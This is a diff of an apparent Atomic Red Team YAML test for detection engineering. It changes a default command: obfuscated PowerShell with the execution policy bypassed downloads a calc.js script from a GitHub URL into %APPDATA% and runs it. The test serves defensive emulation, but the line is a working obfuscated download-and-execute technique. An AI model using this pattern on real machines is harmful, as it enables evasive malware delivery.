@@ -78,12 +78,13 @@ atomic_tests:
             description: cmd.exe command to execute
             type: String
             default: |
-                "powershell.exe -command "-nopr -Exec Bypass (NewObject ','S','ys','te','m."""``N```e``t"""."""W`','`e','','`B`','','','c`l`','I`e```N``t""")."""`d`O`W`','','','n`L`o`A`D`s``tr`I`ng"""(("{0}{1}" -f'h','ttps:/')+("{0}{1}" -f '/ra','w.g')+("{0}{1}" -f 'i','thu'),("{0}{1}" -f'bus','e'),'rco'+'n'+'t'+'en'+("{0}{1}"-f't.co','m/')+("{1}{0}" -f 'o','Cyb')+("{2}{0}{1}"-f 'gSe','cur','r')+'i'+'t'+("{1}{0}"-f'y','y/c')+'bor'+("{1}{0}"-f'to','g-a')+'mi'+'c-'+'r'+("{1}{0}" -f'a','ed-te')+'m/'+("{0}{1}"-f 'ma','st')+("{1}{0}" -f 'a','er/')+("{0}{2}{1}" -f 'tom','cs/','i')+'TA','0'+'00'+'3/'+'ca'+("{1}{0}"-f's','lc.j'), $env:APPDATA + ((("{3}{1}{2}{0}"-f 's','0}calc.','j','{'))  -F  [ChaR]92)); Start-Process $env:APPDATA'\calc.js'""
+                "powershell.exe -command "-nopr -Exec Bypass (NewObject ','S','ys','te','m."""``N```e``t"""."""W`','`e','','`B`','','','c`l`','I`e```N``t""")."""`d`O`W`','','','n`L`o`A`D`s``tr`I`ng"""(('h'+'t'+("{0}{1}" -f'tps','://')+("{2}{0}{1}" -f'aw.g','ithu','r')+'bus'+'e'+("{0}{1}" -f'rcont','e')+'n'+("{0}{1}{2}{3}" -f 't','.co','m/Cy','bo')+'r'+("{1}{2}{0}" -f 'urit','gSe','c')+("{1}{2}{0}"-f 'o','y/c','yb')+("{0}{1}" -f'rg-a','t')+'o'+'mic'+("{0}{1}" -f '-r','ed-')+'t'+'ea'+'m'+("{1}{0}" -f'mas','/')+("{1}{0}{2}"-f'er/a','t','tomic')+("{1}{0}" -f 'A0','s/T')+'003'+'/'+'ca'+'l'+'c.'+'js'), $env:APPDATA + ((("{3}{1}{2}{0}"-f 's','0}calc.','j','{'))  -F  [ChaR]92)); Start-Process $env:APPDATA'\calc.js'""
     executor:
         command: |
             Start-Process cmd.exe -ArgumentList "#{cmd_command}"
         name: powershell
         elevation_required: false
+
 -   name: Powershell invoke mshta.exe download
     auto_generated_guid: 8a2ad40b-12c7-4b25-8521-2737b0a415af
     description: |
